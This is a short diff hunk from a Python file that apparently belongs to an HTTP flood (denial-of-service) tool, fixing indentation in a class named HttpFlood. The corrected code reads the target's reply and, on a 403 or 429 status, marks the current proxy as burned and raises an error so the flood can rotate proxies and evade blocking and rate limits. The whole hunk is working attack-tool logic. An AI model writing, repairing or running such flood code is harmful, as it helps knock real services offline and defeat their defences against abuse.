@@ -2591,15 +2591,15 @@ class HttpFlood(Thread):
                     if readable:
                         try:
                             response_start = s.recv(64).decode('utf-8', errors='ignore')
-                        if "HTTP/1.1" in response_start or "HTTP/1.0" in response_start:
-                            status_code = response_start.split(" ")[1]
-                            if status_code in {"403", "429"}:
-                                if hasattr(self, '_current_proxy'):
-                                    BURNED_PROXIES[self._current_proxy] = time()
-                                raise Exception("Proxy Blocked")
-                    except Exception as e:
-                        if "Blocked" in str(e): raise e
-                        pass
+                            if "HTTP/1.1" in response_start or "HTTP/1.0" in response_start:
+                                status_code = response_start.split(" ")[1]
+                                if status_code in {"403", "429"}:
+                                    if hasattr(self, '_current_proxy'):
+                                        BURNED_PROXIES[self._current_proxy] = time()
+                                    raise Exception("Proxy Blocked")
+                        except Exception as e:
+                            if "Blocked" in str(e): raise e
+                            pass
         except:
             pass
         Tools.safe_close(s)
